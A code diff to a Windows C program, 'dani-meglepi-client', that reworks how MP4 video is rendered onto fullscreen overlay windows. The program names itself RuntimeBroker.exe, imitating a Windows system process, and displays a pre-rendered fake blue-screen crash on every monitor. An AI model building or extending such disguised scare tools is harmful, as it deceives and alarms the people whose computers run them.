@@ -1,6 +1,7 @@
 /*
  * dani-meglepi-client v4 — RuntimeBroker.exe
  *
+ *
  * ════════════════════════════════════════════════════════════════
  * Fordítás:
  *   x86_64-w64-mingw32-windres version.rc -O coff -o version.res
@@ -122,8 +123,7 @@ static BOOL gdiplus_init(void) {
 typedef struct {
     RECT    rect;           /* monitor pozíció + méret a virtuális asztalon */
     int     w, h;           /* monitor felbontása */
-    HWND    overlay;        /* fullscreen overlay ablak */
-    HWND    evr_wnd;        /* rejtett EVR ablak MP4-hez */
+    HWND    overlay;        /* fullscreen overlay ablak — EVR is erre renderel */
     HBITMAP bsod_bmp;       /* előre renderelt BSOD HBITMAP */
     IMFMediaSession *mf_session;
     IMFMediaSource  *mf_source;
@@ -253,17 +253,10 @@ static void monitors_init(void) {
     for (int i=0;i<g_mon_count;i++) {
         MonitorCtx *m=&g_monitors[i];
 
-        /* Overlay ablak */
+        /* Overlay ablak — egyben az EVR render célpontja MP4 közben */
         m->overlay=CreateWindowExW(
             WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
             L"DM_Overlay",L"",WS_POPUP,
-            m->rect.left,m->rect.top,1,1,
-            NULL,NULL,g_hInst,NULL);
-
-        /* EVR ablak */
-        m->evr_wnd=CreateWindowExW(
-            WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
-            L"DM_EVRHost",L"",WS_POPUP,
             m->rect.left,m->rect.top,1,1,
             NULL,NULL,g_hInst,NULL);
 
@@ -439,8 +432,9 @@ static void mp4_play_on(MonitorCtx *m) {
 
         BOOL node_ok=FALSE;
         if (IsEqualGUID(&major,&MFMediaType_Video)) {
+            /* EVR közvetlenül az overlay ablakra renderel */
             IMFActivate *evr=NULL;
-            if (SUCCEEDED(MFCreateVideoRendererActivate(m->evr_wnd,&evr))&&evr) {
+            if (SUCCEEDED(MFCreateVideoRendererActivate(m->overlay,&evr))&&evr) {
                 IMFTopologyNode_SetObject(on,(IUnknown*)evr);
                 IMFActivate_Release(evr);
                 node_ok=TRUE;
@@ -499,7 +493,6 @@ static void mp4_stop_on(MonitorCtx *m) {
     if (m->mf_session) {
         IMFMediaSession_Release(m->mf_session); m->mf_session=NULL;
     }
-    if (m->evr_wnd) ShowWindow(m->evr_wnd,SW_HIDE);
 }
 
 /* ── Show lépések ───────────────────────────────────────────────────────── */
@@ -637,7 +630,13 @@ static void overlay_paint(HWND hwnd) {
                     FillRect(mdc,&rc,bb); DeleteObject(bb);
                 }
                 break;
-            case SH_MP4: break; /* EVR renderel az evr_wnd-re */
+            case SH_MP4:
+                /* MP4 módban az EVR közvetlenül az overlay-re renderel.
+                   Ne rajzoljunk semmit GDI-vel — csak validáljuk a területet. */
+                SelectObject(mdc,ob); DeleteObject(bm); DeleteDC(mdc);
+                ValidateRect(hwnd,NULL);
+                EndPaint(hwnd,&ps);
+                return;
         }
     }
 
@@ -671,17 +670,9 @@ static LRESULT CALLBACK msg_wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp) {
         case WM_DO_CLEAR: do_clear(); return 0;
 
         case WM_MP4_STARTED: {
-            /* MESessionStarted érkezett — most már biztonságosan
-               beállíthatjuk az EVR ablakot és a videó pozícióját */
             MonitorCtx *m=(MonitorCtx*)wp;
             if (!m||!m->mf_session) return 0;
-
-            /* EVR ablak: fullscreen, a monitor pozíciójára */
-            SetWindowPos(m->evr_wnd, m->overlay,
-                m->rect.left, m->rect.top, m->w, m->h,
-                SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);
-
-            /* EVR videó pozíció: teljes ablak */
+            /* EVR videó pozíció: az overlay teljes területe */
             IMFVideoDisplayControl *vdc=NULL;
             HRESULT hr=MFGetService((IUnknown*)m->mf_session,
                 &MR_VIDEO_RENDER_SERVICE,
@@ -691,10 +682,6 @@ static LRESULT CALLBACK msg_wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp) {
                 IMFVideoDisplayControl_SetVideoPosition(vdc,NULL,&dest);
                 IMFVideoDisplayControl_Release(vdc);
             }
-
-            /* Overlay maradjon a legfelső (EVR fölé) */
-            SetWindowPos(m->overlay,HWND_TOPMOST,0,0,0,0,
-                SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
             return 0;
         }
         case WM_TIMER:
@@ -969,11 +956,6 @@ int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR cmd,int nShow) {
     /* Overlay ablak osztály */
     wc.lpfnWndProc=overlay_wndproc;
     wc.lpszClassName=L"DM_Overlay";
-    RegisterClassExW(&wc);
-
-    /* EVR ablak osztály */
-    wc.lpfnWndProc=evr_wndproc;
-    wc.lpszClassName=L"DM_EVRHost";
     RegisterClassExW(&wc);
 
     /* Monitorok inicializálása (ablakok + BSOD) */
